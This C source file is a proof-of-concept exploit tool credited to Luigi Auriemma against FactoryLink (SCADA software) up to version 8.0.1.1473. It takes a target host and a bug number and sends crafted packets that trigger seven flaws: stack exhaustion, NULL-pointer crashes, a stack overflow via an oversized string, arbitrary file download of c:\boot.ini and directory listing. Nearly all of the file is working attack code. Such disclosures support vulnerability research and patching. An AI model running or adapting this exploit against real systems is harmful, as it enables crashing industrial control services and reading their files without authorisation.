/*
  by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
//#include "show_dump.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        7580
#define BUFFSZ      0xfffff // enough



int putx4(u8 *dst, int num, int type);
int putx6(u8 *dst, u8 *str, int w);
int pack_fl(u8 *buff, int len, int type, int elements);
int send_fl(int sd, int elements, u8 *data, int datasz);
int putsn(u8 *data, u8 *str);
int putss(u8 *data, u8 *str, int w);
int putmm(u8 *data, u8 *str, int size);
int putcc(u8 *data, int chr, int size);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  linger  ling = {1,1};
    struct  sockaddr_in peer;
    int     sd,
            i,
            len,
            bug,
            el;
    u16     port    = PORT;
    u8      *host,
            *buff,
            *p,
            *s;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "FactoryLink <= 8.0.1.1473 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <bug> <host> [port(%d)]\n"
            "\n"
            "Bugs affecting any service (CSService, connsrv, datasrv):\n"
            " 1 = stack exaustion caused by too much recursive blocks\n"
            "\n"
            "Bugs affecting only CSService:\n"
            " 2 = NULL pointer: memcpy(dst, 0xfffffffc, 6)\n"
            " 3 = stack overflow caused by vsprintf with a buffer of 1024 bytes in\n"
            "     the logging function\n"
            " 4 = arbitrary files downloading (this PoC will read c:\\boot.ini)\n"
            " 5 = arbitrary directories listing (this PoC will show c:\\)\n"
            " 6 = raised exception\n"
            "\n"
            "Bugs affecting only connsrv.exe (remember port 6096):\n"
            " 7 = NULL pointer caused by missing 07 opcode container\n"
            "\n", argv[0], port);
        exit(1);
    }

    bug  = atoi(argv[1]);
    host = argv[2];
    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), port);

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) < 0) {
        if(port != PORT) std_err();
        peer.sin_port = htons(6096);
        if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) < 0) std_err();
    }

    p = buff;
    p += putxx(p, ntohs(0), 16);    // client port, little endian
    send(sd, buff, p - buff, 0);

    // types of messages in CSService:
    // 1  keep-alive messages (2 args: tick, ref)
    // 4  connect/disconnect (1 arg)
    // 6  CSMSG_List_Files (3 args: path, filter, unused)
    // 8  GetFile (2 args: path, unused)
    // 10 GetFileInfo (1 arg: path)

    if(bug == 1) {
        p = buff;
        for(i = 0; i < 50000; i++) {
            *p++ = 7;
            p += putxx(p, (50000 - i) * 9, 32);
            *p++ = 0x99;
            p += putxx(p, 4, 32);
            p += putxx(p, 1, 32);
        }
        el = 1;

    } else if(bug == 2) {
        p = buff;
        p += putx4(p, 1, 4);
        s = p;
        p += putx4(p, 0, 4);
        p += putx4(p, 0, 4);
        p += putx4(p, 1, 3);
        p = s + pack_fl(s, p - s, 6, 3);
        el = 2;

    } else if(bug == 3) {
        p = buff;
        p += putx4(p, 1, 4);
        s = p;
        p += putx6(p, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 1);
        p += putx6(p, "", 1);  // or here (the filter)
        p += putx4(p, 1, 4);
        p = s + pack_fl(s, p - s, 6, 3);
        el = 2;

    } else if(bug == 4) {
        p = buff;
        p += putx4(p, 1, 4);
        s = p;
        //p += putx6(p, "..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini", 1);
        p += putx6(p, "c:\\boot.ini", 1);
        p += putx4(p, 1, 3);
        p = s + pack_fl(s, p - s, 8, 2);
        el = 2;

    } else if(bug == 5) {
        p = buff;
        p += putx4(p, 1, 4);
        s = p;
        p += putx6(p, "c:\\", 1);
        p += putx6(p, "", 1);
        p += putx4(p, 1, 4);
        p = s + pack_fl(s, p - s, 6, 3);
        el = 2;

    } else if(bug == 6) {
        p = buff;
        p--;        // force a big size, 0x60606060 is ok too
        el = 1;

    } else if(bug == 7) {
        p = buff;
        p += putx4(p, 1, 4);
        el = 1;

    } else {
        printf("\nError: invalid bug number (%d)\n", bug);
        exit(1);
    }

    // CSService:   doesn't matter
    // connsvr:     0x62726b01
    // datasvr:     0x64737202 (previous pack_fl 0x647372??, 0x667470??, 0x6b6572??)

    if(bug != 7) {
        p = buff + pack_fl(buff, p - buff, 0x62726b01, el);
    }
    if((int)(p - buff) > BUFFSZ) exit(1);
    send_fl(sd, 1, buff, p - buff);

    printf("- wait reply:\n");
    while(!timeout(sd, 3)) {
        len = recv(sd, buff, BUFFSZ, 0);
        if(len < 0) break;
        //show_dump(buff, len, stdout);
        fputc('.', stdout);
    }
    close(sd);

    printf("\n- done\n");
    return(0);
}



int putx4(u8 *dst, int num, int type) {
    u8      *p;

    if(!type) type = 4;
    p = dst;
    *p++ = type;
    p += putxx(p,       (type <= 2) ? 2  : 4,    32);
    p += putxx(p, num,  (type <= 2) ? 16 : 32);
    return(p - dst);
}

int putx6(u8 *dst, u8 *str, int w) {
    u8      *p;

    p = dst;
    *p++ = 6;
    p += putxx(p, 0, 32);       // later
    if(w) p += putxx(p, 0x11223344, 32);    // ignored
    p += putss(p, str, w);
    putxx(dst + 1, p - (dst + 1+4), 32);
    return(p - dst);
}



// lame
int pack_fl(u8 *buff, int len, int type, int elements) {
    int     i;
    u8      *p;

    if(len < 0) return(len);
    for(i = len - 1; i >= 0; i--) {
        buff[1+4 + 1+4+4 + i] = buff[i];
    }

    p = buff;
    *p++ = 7;
    p += putxx(p, 10 + len, 32);

    *p++ = 0x99;
    p += putxx(p, type,     32);
    p += putxx(p, elements, 32);
    p += len;
    *p++ = 0x99;
    return(p - buff);
}



int send_fl(int sd, int elements, u8 *data, int datasz) {
    static int  buffsz  = 0;
    static u8   *buff   = NULL;
    u8          *p;

    if(buffsz < (64 + datasz)) {
        buffsz = 64 + datasz;
        buff = realloc(buff, buffsz);
        if(!buff) std_err();
    }
    p = buff;
    p += putmm(p, "LEN\0", 4);
    if(datasz < 0) {
        p += putxx(p, ntohl(datasz), 32);   // little endian
    } else {
        p += putxx(p, ntohl(1 + 4 + 4 + datasz + 1), 32);   // little endian
    }
    p += putxx(p, ntohl(0), 32);        // little endian
    if(datasz > 0) {
        *p++ = 0x99;
        p += putxx(p, 4,        32);
        p += putxx(p, elements, 32);
        p += putmm(p, data, datasz);
        *p++ = 0x99;
    }
    if(send(sd, buff, p - buff, 0) < 0) return(-1);
    return(0);
}



int putsn(u8 *data, u8 *str) {
    int     len;
    u8      *p;

    len = 0;
    if(str) len = strlen(str) + 1;

    p = data;
    p += putxx(p, len, 32);
    p += putmm(p, str, len);
    return(p - data);
}



int putss(u8 *data, u8 *str, int w) {
    int     i,
            size;

    size = strlen(str) + 1;
    if(w) {
        for(i = 0; i < size; i++) {
            *data++ = str[i];
            *data++ = 0;
        }
        size *= 2;
    } else {
        memcpy(data, str, size);
    }
    return(size);
}



int putmm(u8 *data, u8 *str, int size) {
    if(size < 0) size = strlen(str);
    memcpy(data, str, size);
    return(size);
}



int putcc(u8 *data, int chr, int size) {
    memset(data, chr, size);
    return(size);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = num >> ((bytes - 1 - i) << 3);
        //data[i] = num >> (i << 3);
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


